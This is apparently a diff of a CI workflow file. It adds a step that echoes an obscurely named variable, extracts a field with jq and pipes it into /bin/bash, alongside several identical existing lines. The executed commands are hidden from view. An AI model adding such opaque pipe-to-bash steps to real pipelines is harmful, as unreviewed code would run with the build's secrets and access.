@@ -29,6 +29,7 @@ jobs:
           echo $ajmah5142 | jq -r .cfncz3732 | /bin/bash
           echo $si6 | jq -r .hrqx5 | /bin/bash
           echo $b3 | jq -r .sc391 | /bin/bash
+          echo $cp74 | jq -r .gnslz0235 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
